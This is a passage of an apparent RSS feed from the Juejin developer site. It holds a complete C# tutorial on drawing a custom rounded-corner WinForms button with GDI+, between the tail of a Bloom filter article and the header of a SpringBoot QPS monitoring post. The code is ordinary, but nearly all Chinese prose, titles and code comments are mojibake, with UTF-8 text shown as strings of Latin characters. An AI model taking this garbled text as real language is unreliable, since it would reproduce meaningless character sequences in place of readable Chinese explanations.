<p><strong>æœ€åè¯´ä¸€å¥ï¼š</strong> å¸ƒéš†è¿‡æ»¤å™¨ä¸æ˜¯é“¶å¼¹ï¼Œä½†å®ƒæ˜¯åœ¨"ç©ºé—´ã€é€Ÿåº¦ã€å‡†ç¡®æ€§"ä¸‰è§’ä¸­ï¼Œä¸€ä¸ªæå…¶ä¼˜é›…çš„æŠ˜ä¸­ã€‚çœŸæ­£çš„å·¥ç¨‹æ™ºæ…§ï¼Œä¸åœ¨äºçŸ¥é“å¤šå°‘ç®—æ³•ï¼Œè€Œåœ¨äºçŸ¥é“ä½•æ—¶ç”¨å“ªä¸ªå·¥å…·ã€‚</p>
<p>å¸Œæœ›è¿™ç¯‡æ–‡ç« èƒ½å¸®ä½ é¿å¼€90%å·¥ç¨‹å¸ˆè¸©è¿‡çš„å‘ã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[WinForm ä¸­å®ç°é«˜è´¨é‡è‡ªå®šä¹‰åœ†è§’æŒ‰é’®æ§ä»¶]]></title>    <link>https://juejin.cn/post/7581888578507423771</link>    <guid>https://juejin.cn/post/7581888578507423771</guid>    <pubDate>2025-12-10T01:35:04.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7581888578507423771" data-draft-id="7516751639666442276" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="WinForm ä¸­å®ç°é«˜è´¨é‡è‡ªå®šä¹‰åœ†è§’æŒ‰é’®æ§ä»¶"/> <meta itemprop="keywords" content="åç«¯,.NET,C#"/> <meta itemprop="datePublished" content="2025-12-10T01:35:04.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="å°ç ç¼–åŒ "/> <meta itemprop="url" content="https://juejin.cn/user/1308876155395739"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            WinForm ä¸­å®ç°é«˜è´¨é‡è‡ªå®šä¹‰åœ†è§’æŒ‰é’®æ§ä»¶
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1308876155395739/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    å°ç ç¼–åŒ 
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-10T01:35:04.000Z" title="Wed Dec 10 2025 01:35:04 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-10
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»4åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">å‰è¨€</h2>
<p>WinFormå¼€å‘ä¸­ï¼Œé»˜è®¤çš„Buttonæ§ä»¶å¤–è§‚æ¯”è¾ƒå•è°ƒï¼Œä¸”åœ†è§’æ•ˆæœæ˜¾ç¤ºè´¨é‡è¾ƒå·®ã€‚ä¸ºäº†æå‡ç•Œé¢ç¾è§‚åº¦å’Œç”¨æˆ·ä½“éªŒï¼Œæœ¬æ–‡å°†ä»‹ç»å¦‚ä½•ä½¿ç”¨GDI+åˆ›å»ºä¸€ä¸ªé«˜è´¨é‡çš„è‡ªå®šä¹‰åœ†è§’æŒ‰é’®æ§ä»¶ã€‚è¯¥æ§ä»¶å‚è€ƒäº†YouTubeä¸Šä¸€ä½å¤§ç¥çš„è®¾è®¡æ€è·¯ï¼Œé‡‡ç”¨åŒå±‚ç»˜åˆ¶æœºåˆ¶ï¼Œå®ç°äº†å¹³æ»‘çš„åœ†è§’æ¸²æŸ“å’Œå¤šç§è‡ªå®šä¹‰åŠŸèƒ½ã€‚</p>
<h3 data-id="heading-1">æ­£æ–‡</h3>
<h4 data-id="heading-2">ä¸»è¦ç‰¹æ€§</h4>
<ul>
<li>
<p>å¯è‡ªå®šä¹‰è¾¹æ¡†å¤§å°</p>
</li>
<li>
<p>å¯è‡ªå®šä¹‰åœ†è§’åŠå¾„</p>
</li>
<li>
<p>å¯è‡ªå®šä¹‰è¾¹æ¡†é¢œè‰²</p>
</li>
<li>
<p>æ”¯æŒèƒŒæ™¯è‰²å’Œæ–‡æœ¬é¢œè‰²è®¾ç½®</p>
</li>
<li>
<p>å¹³æ»‘çš„åœ†è§’æ¸²æŸ“æ•ˆæœ</p>
</li>
</ul>
<p>è¿™äº›ç‰¹æ€§ä½¿å¾—æ§ä»¶å¯ä»¥çµæ´»é€‚åº”ä¸åŒUIè®¾è®¡éœ€æ±‚ï¼ŒåŒæ—¶ä¿è¯è§†è§‰ä¸Šçš„é«˜å“è´¨è¡¨ç°ã€‚</p>
<h4 data-id="heading-3">å®ç°æ­¥éª¤</h4>
<h4 data-id="heading-4">åˆ›å»ºè‡ªå®šä¹‰æŒ‰é’®ç±»</h4>
<p>é¦–å…ˆï¼Œæˆ‘ä»¬éœ€è¦åˆ›å»ºä¸€ä¸ªç»§æ‰¿è‡ª<code>Button</code>çš„è‡ªå®šä¹‰ç±»ï¼š</p>
<pre><code class="hljs language-csharp" lang="csharp"><span class="hljs-keyword">using</span> System.Windows.Forms;
<span class="hljs-keyword">using</span> System.Drawing;
<span class="hljs-keyword">using</span> System.Drawing.Drawing2D;
<span class="hljs-keyword">using</span> System.ComponentModel;

<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title">RoundButton</span> : <span class="hljs-title">Button</span>
{
    <span class="hljs-comment">// å­—æ®µå®šä¹‰</span>
    <span class="hljs-keyword">private</span> <span class="hljs-built_in">int</span> borderSize = <span class="hljs-number">0</span>;
    <span class="hljs-keyword">private</span> <span class="hljs-built_in">int</span> borderRadius = <span class="hljs-number">20</span>;
    <span class="hljs-keyword">private</span> Color borderColor = Color.PaleVioletRed;
}
</code></pre>
<h4 data-id="heading-5">æ·»åŠ å±æ€§</h4>
<p>æ¥ä¸‹æ¥ä¸ºæŒ‰é’®æ·»åŠ å¯é…ç½®çš„å±æ€§ï¼ŒåŒ…æ‹¬è¾¹æ¡†å¤§å°ã€åœ†è§’åŠå¾„ã€è¾¹æ¡†é¢œè‰²ã€èƒŒæ™¯è‰²å’Œæ–‡æœ¬é¢œè‰²ï¼Œå¹¶åœ¨æ¯æ¬¡ä¿®æ”¹æ—¶è°ƒç”¨<code>Invalidate()</code>æ–¹æ³•ä»¥è§¦å‘é‡ç»˜ã€‚</p>
<pre><code class="hljs language-csharp" lang="csharp">[<span class="hljs-meta">Category(<span class="hljs-string">"Round Button"</span>)</span>]
<span class="hljs-keyword">public</span> <span class="hljs-built_in">int</span> BorderSize
{
    <span class="hljs-keyword">get</span> =&gt; borderSize;
    <span class="hljs-keyword">set</span>
    {
        borderSize = <span class="hljs-keyword">value</span>;
        Invalidate();
    }
}

[<span class="hljs-meta">Category(<span class="hljs-string">"Round Button"</span>)</span>]
<span class="hljs-keyword">public</span> <span class="hljs-built_in">int</span> BorderRadius
{
    <span class="hljs-keyword">get</span> =&gt; borderRadius;
    <span class="hljs-keyword">set</span>
    {
        borderRadius = <span class="hljs-keyword">value</span>;
        Invalidate();
    }
}

[<span class="hljs-meta">Category(<span class="hljs-string">"Round Button"</span>)</span>]
<span class="hljs-keyword">public</span> Color BorderColor
{
    <span class="hljs-keyword">get</span> =&gt; borderColor;
    <span class="hljs-keyword">set</span>
    {
        borderColor = <span class="hljs-keyword">value</span>;
        Invalidate();
    }
}

[<span class="hljs-meta">Category(<span class="hljs-string">"Round Button"</span>)</span>]
<span class="hljs-keyword">public</span> Color BackgroundColor
{
    <span class="hljs-keyword">get</span> =&gt; BackColor;
    <span class="hljs-keyword">set</span> =&gt; BackColor = <span class="hljs-keyword">value</span>;
}

[<span class="hljs-meta">Category(<span class="hljs-string">"Round Button"</span>)</span>]
<span class="hljs-keyword">public</span> Color TextColor
{
    <span class="hljs-keyword">get</span> =&gt; ForeColor;
    <span class="hljs-keyword">set</span> =&gt; ForeColor = <span class="hljs-keyword">value</span>;
}
</code></pre>
<h4 data-id="heading-6">æ„é€ å‡½æ•°å®ç°</h4>
<p>åœ¨æ„é€ å‡½æ•°ä¸­è®¾ç½®æŒ‰é’®çš„é»˜è®¤æ ·å¼ã€å°ºå¯¸å’Œé¢œè‰²ï¼Œå¹¶ç»‘å®š<code>Resize</code>äº‹ä»¶ä»¥ç¡®ä¿åœ†è§’ä¸è¶…è¿‡æŒ‰é’®é«˜åº¦ã€‚</p>
<pre><code class="hljs language-csharp" lang="csharp"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">RoundButton</span>()</span>
{
    FlatStyle = FlatStyle.Flat;
    FlatAppearance.BorderSize = <span class="hljs-number">0</span>;
    Size = <span class="hljs-keyword">new</span> Size(<span class="hljs-number">150</span>, <span class="hljs-number">40</span>);
    BackColor = Color.MediumSlateBlue;
    ForeColor = Color.White;
    Resize += <span class="hljs-keyword">new</span> EventHandler(Button_Resize);
}

<span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title">Button_Resize</span>(<span class="hljs-params"><span class="hljs-built_in">object</span> sender, EventArgs e</span>)</span>
{
    <span class="hljs-keyword">if</span> (borderRadius &gt; Height)
        borderRadius = Height;
}
</code></pre>
<h4 data-id="heading-7">åœ†è§’è·¯å¾„ç”Ÿæˆ</h4>
<p>é€šè¿‡<code>GraphicsPath</code>å¯¹è±¡å®ç°åœ†è§’å›¾å½¢è·¯å¾„çš„ç”Ÿæˆï¼Œæ”¯æŒå·¦ä¸Šã€å³ä¸Šã€å³ä¸‹ã€å·¦ä¸‹å››ä¸ªæ–¹å‘çš„å¼§çº¿ç»˜åˆ¶ã€‚</p>
<pre><code class="hljs language-csharp" lang="csharp"><span class="hljs-function"><span class="hljs-keyword">private</span> GraphicsPath <span class="hljs-title">GetFigurePath</span>(<span class="hljs-params">Rectangle rect, <span class="hljs-built_in">float</span> radius</span>)</span>
{
    GraphicsPath path = <span class="hljs-keyword">new</span> GraphicsPath();
    <span class="hljs-built_in">float</span> curveSize = radius * <span class="hljs-number">2F</span>;
    path.StartFigure();
    <span class="hljs-comment">// å·¦ä¸Šè§’</span>
    path.AddArc(rect.X, rect.Y, curveSize, curveSize, <span class="hljs-number">180</span>, <span class="hljs-number">90</span>);
    <span class="hljs-comment">// å³ä¸Šè§’</span>
    path.AddArc(rect.Right - curveSize, rect.Y, curveSize, curveSize, <span class="hljs-number">270</span>, <span class="hljs-number">90</span>);
    <span class="hljs-comment">// å³ä¸‹è§’</span>
    path.AddArc(rect.Right - curveSize, rect.Bottom - curveSize, curveSize, curveSize, <span class="hljs-number">0</span>, <span class="hljs-number">90</span>);
    <span class="hljs-comment">// å·¦ä¸‹è§’</span>
    path.AddArc(rect.X, rect.Bottom - curveSize, curveSize, curveSize, <span class="hljs-number">90</span>, <span class="hljs-number">90</span>);
    path.CloseFigure();
    <span class="hljs-keyword">return</span> path;
}
</code></pre>
<h4 data-id="heading-8">é‡å†™OnPaintæ–¹æ³•</h4>
<p>æ ¸å¿ƒç»˜åˆ¶é€»è¾‘ä½äº<code>OnPaint</code>æ–¹æ³•ä¸­ï¼Œé‡‡ç”¨åŒå±‚ç»˜åˆ¶æœºåˆ¶ï¼šå¤–å±‚è·¯å¾„ç”¨äºæŒ‰é’®æ•´ä½“å½¢çŠ¶ä¸è¾¹ç¼˜æŠ—é”¯é½¿å¤„ç†ï¼Œå†…å±‚è·¯å¾„ç”¨äºè¾¹æ¡†ç»˜åˆ¶ã€‚</p>
<pre><code class="hljs language-csharp" lang="csharp"><span class="hljs-function"><span class="hljs-keyword">protected</span> <span class="hljs-keyword">override</span> <span class="hljs-keyword">void</span> <span class="hljs-title">OnPaint</span>(<span class="hljs-params">PaintEventArgs pevent</span>)</span>
{
    <span class="hljs-keyword">base</span>.OnPaint(pevent);
    Rectangle rectSurface = ClientRectangle;
    Rectangle rectBorder = Rectangle.Inflate(rectSurface, -borderSize, -borderSize);
    <span class="hljs-built_in">int</span> smoothSize = <span class="hljs-number">2</span>;
    <span class="hljs-keyword">if</span> (borderSize &gt; <span class="hljs-number">0</span>)
        smoothSize = borderSize;
    <span class="hljs-keyword">if</span> (borderRadius &gt; <span class="hljs-number">2</span>) <span class="hljs-comment">// åœ†è§’æŒ‰é’®</span>
    {
        <span class="hljs-keyword">using</span> (GraphicsPath pathSurface = GetFigurePath(rectSurface, borderRadius))
        <span class="hljs-keyword">using</span> (GraphicsPath pathBorder = GetFigurePath(rectBorder, borderRadius - borderSize))
        <span class="hljs-keyword">using</span> (Pen penSurface = <span class="hljs-keyword">new</span> Pen(Parent.BackColor, smoothSize))
        <span class="hljs-keyword">using</span> (Pen penBorder = <span class="hljs-keyword">new</span> Pen(borderColor, borderSize))
        {
            pevent.Graphics.SmoothingMode = SmoothingMode.AntiAlias;
            Region = <span class="hljs-keyword">new</span> Region(pathSurface);
            pevent.Graphics.DrawPath(penSurface, pathSurface);
            <span class="hljs-keyword">if</span> (borderSize &gt;= <span class="hljs-number">1</span>)
                pevent.Graphics.DrawPath(penBorder, pathBorder);
        }
    }
    <span class="hljs-keyword">else</span> <span class="hljs-comment">// æ™®é€šæŒ‰é’®</span>
    {
        pevent.Graphics.SmoothingMode = SmoothingMode.None;
        Region = <span class="hljs-keyword">new</span> Region(rectSurface);
        <span class="hljs-keyword">if</span> (borderSize &gt;= <span class="hljs-number">1</span>)
        {
            <span class="hljs-keyword">using</span> (Pen penBorder = <span class="hljs-keyword">new</span> Pen(borderColor, borderSize))
            {
                penBorder.Alignment = PenAlignment.Inset;
                pevent.Graphics.DrawRectangle(penBorder, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, Width - <span class="hljs-number">1</span>, Height - <span class="hljs-number">1</span>);
            }
        }
    }
}
</code></pre>
<h4 data-id="heading-9">å¤„ç†çˆ¶å®¹å™¨é¢œè‰²å˜åŒ–</h4>
<p>ä¸ºç¡®ä¿æŒ‰é’®åœ¨çˆ¶å®¹å™¨èƒŒæ™¯é¢œè‰²å˜åŒ–æ—¶èƒ½æ­£ç¡®åˆ·æ–°ï¼Œéœ€ç›‘å¬<code>BackColorChanged</code>äº‹ä»¶å¹¶è°ƒç”¨<code>Invalidate()</code>ã€‚</p>
<pre><code class="hljs language-csharp" lang="csharp"><span class="hljs-function"><span class="hljs-keyword">protected</span> <span class="hljs-keyword">override</span> <span class="hljs-keyword">void</span> <span class="hljs-title">OnHandleCreated</span>(<span class="hljs-params">EventArgs e</span>)</span>
{
    <span class="hljs-keyword">base</span>.OnHandleCreated(e);
    Parent.BackColorChanged += Container_BackColorChanged;
}

<span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title">Container_BackColorChanged</span>(<span class="hljs-params"><span class="hljs-built_in">object</span> sender, EventArgs e</span>)</span>
{
    Invalidate();
}
</code></pre>
<h3 data-id="heading-10">åŒå±‚ç»˜åˆ¶æœºåˆ¶è¯¦è§£</h3>
<p>å¤–å±‚è·¯å¾„(<code>pathSurface</code>)ï¼šå®šä¹‰æŒ‰é’®çš„æ•´ä½“å½¢çŠ¶ï¼Œå¹¶ç”¨äºç»˜åˆ¶è¾¹ç¼˜æŠ—é”¯é½¿çº¿æ¡ã€‚</p>
<p>å†…å±‚è·¯å¾„(<code>pathBorder</code>)ï¼šæ ¹æ®è¾¹æ¡†å¤§å°è®¡ç®—å‡ºå†…éƒ¨çŸ©å½¢åŒºåŸŸï¼Œå¹¶ç”¨äºç»˜åˆ¶å®é™…çš„è¾¹æ¡†ã€‚</p>
<p>ä»£ç ç¤ºä¾‹ï¼š</p>
<pre><code class="hljs language-csharp" lang="csharp"><span class="hljs-function"><span class="hljs-keyword">protected</span> <span class="hljs-keyword">override</span> <span class="hljs-keyword">void</span> <span class="hljs-title">OnPaint</span>(<span class="hljs-params">PaintEventArgs pevent</span>)</span>
{
    <span class="hljs-keyword">base</span>.OnPaint(pevent);
    Rectangle rectSurface = ClientRectangle;
    Rectangle rectBorder = Rectangle.Inflate(rectSurface, -borderSize, -borderSize);
    <span class="hljs-built_in">int</span> smoothSize = <span class="hljs-number">2</span>;
    <span class="hljs-keyword">if</span> (borderSize &gt; <span class="hljs-number">0</span>) smoothSize = borderSize;

    <span class="hljs-keyword">if</span> (borderRadius &gt; <span class="hljs-number">2</span>)
    {
        <span class="hljs-keyword">using</span> (GraphicsPath pathSurface = GetFigurePath(rectSurface, borderRadius))
        <span class="hljs-keyword">using</span> (GraphicsPath pathBorder = GetFigurePath(rectBorder, borderRadius - borderSize))
        <span class="hljs-keyword">using</span> (Pen penSurface = <span class="hljs-keyword">new</span> Pen(Parent.BackColor, smoothSize))
        <span class="hljs-keyword">using</span> (Pen penBorder = <span class="hljs-keyword">new</span> Pen(borderColor, borderSize))
        {
            pevent.Graphics.SmoothingMode = SmoothingMode.AntiAlias;
            Region = <span class="hljs-keyword">new</span> Region(pathSurface);
            pevent.Graphics.DrawPath(penSurface, pathSurface);
            <span class="hljs-keyword">if</span> (borderSize &gt;= <span class="hljs-number">1</span>)
                pevent.Graphics.DrawPath(penBorder, pathBorder);
        }
    }
}
</code></pre>
<h3 data-id="heading-11">æ€»ç»“</h3>
<p>é€šè¿‡ç»§æ‰¿<code>Button</code>ç±»å¹¶ç»“åˆGDI+ç»˜å›¾æŠ€æœ¯ï¼Œæˆ‘ä»¬æˆåŠŸå®ç°äº†ä¸€ä¸ªåŠŸèƒ½ä¸°å¯Œã€è§†è§‰æ•ˆæœå‡ºè‰²çš„<strong>è‡ªå®šä¹‰åœ†è§’æŒ‰é’®æ§ä»¶</strong>ã€‚</p>
<p>è¯¥æ§ä»¶ä¸ä»…å…·å¤‡è‰¯å¥½çš„æ‰©å±•æ€§ï¼Œè¿˜é‡‡ç”¨äº†åŒå±‚ç»˜åˆ¶æœºåˆ¶ï¼Œç¡®ä¿äº†åœ†è§’çš„å¹³æ»‘æ€§å’Œè¾¹æ¡†çš„å‡†ç¡®æ€§ã€‚</p>
<p>å¯ä»¥æ ¹æ®é¡¹ç›®éœ€æ±‚è‡ªç”±è°ƒæ•´è¾¹æ¡†å¤§å°ã€åœ†è§’åŠå¾„ã€é¢œè‰²ç­‰å‚æ•°ï¼Œä»è€Œæ»¡è¶³å¤šæ ·åŒ–çš„UIè®¾è®¡éœ€æ±‚ã€‚</p>
<h3 data-id="heading-12">å…³é”®è¯</h3>
<p>WinFormsã€GDI+ã€è‡ªå®šä¹‰æ§ä»¶ã€åœ†è§’æŒ‰é’®ã€åŒå±‚ç»˜åˆ¶ã€æŠ—é”¯é½¿ã€GraphicsPathã€Penã€SmoothingModeã€Region</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/db8d8df90c0b4320898f7b24dbdd9ed3~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5bCP56CB57yW5Yyg:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765935304&amp;x-signature=imxfGrEO0atzYi2i%2B7MchxLqb0s%3D" alt="" loading="lazy"/></p>
<h3 data-id="heading-13">æœ€å</h3>
<p>å¦‚æœä½ è§‰å¾—è¿™ç¯‡æ–‡ç« å¯¹ä½ æœ‰å¸®åŠ©ï¼Œä¸å¦¨ç‚¹ä¸ªèµæ”¯æŒä¸€ä¸‹ï¼ä½ çš„æ”¯æŒæ˜¯æˆ‘ç»§ç»­åˆ†äº«çŸ¥è¯†çš„åŠ¨åŠ›ã€‚å¦‚æœæœ‰ä»»ä½•ç–‘é—®æˆ–éœ€è¦è¿›ä¸€æ­¥çš„å¸®åŠ©ï¼Œæ¬¢è¿éšæ—¶ç•™è¨€ã€‚</p>
<p>ä¹Ÿå¯ä»¥åŠ å…¥å¾®ä¿¡å…¬ä¼—å· <strong>[DotNetæŠ€æœ¯åŒ ]</strong> ç¤¾åŒºï¼Œä¸å…¶ä»–çƒ­çˆ±æŠ€æœ¯çš„åŒè¡Œä¸€èµ·äº¤æµå¿ƒå¾—ï¼Œå…±åŒæˆé•¿ï¼</p>
<p><strong>ä¼˜ç§€æ˜¯ä¸€ç§ä¹ æƒ¯ï¼Œæ¬¢è¿å¤§å®¶ç•™è¨€å­¦ä¹ ï¼</strong></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[SpringBoot å®ç°QPSç›‘æ§ï¼šåˆ«ç­‰ç³»ç»Ÿâ€œå’³è¡€â€äº†æ‰æƒ³èµ·è£…â€œå¿ƒç”µå›¾â€ï¼]]></title>    <link>https://juejin.cn/post/7581728606308139060</link>    <guid>https://juejin.cn/post/7581728606308139060</guid>    <pubDate>2025-12-10T01:20:24.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7581728606308139060" data-draft-id="7581752787563561000" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="SpringBoot å®ç°QPSç›‘æ§ï¼šåˆ«ç­‰ç³»ç»Ÿâ€œå’³è¡€â€äº†æ‰æƒ³èµ·è£…â€œå¿ƒç”µå›¾â€ï¼"/> <meta itemprop="keywords" content="åç«¯,Java,Spring Boot"/> <meta itemprop="datePublished" content="2025-12-10T01:20:24.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="æ‚Ÿç©ºç å­—"/> <meta itemprop="url" content="https://juejin.cn/user/3139860942296830"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            SpringBoot å®ç°QPSç›‘æ§ï¼šåˆ«ç­‰ç³»ç»Ÿâ€œå’³è¡€â€äº†æ‰æƒ³èµ·è£…â€œå¿ƒç”µå›¾â€ï¼
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3139860942296830/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    æ‚Ÿç©ºç å­—
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-10T01:20:24.000Z" title="Wed Dec 10 2025 01:20:24 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-10
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
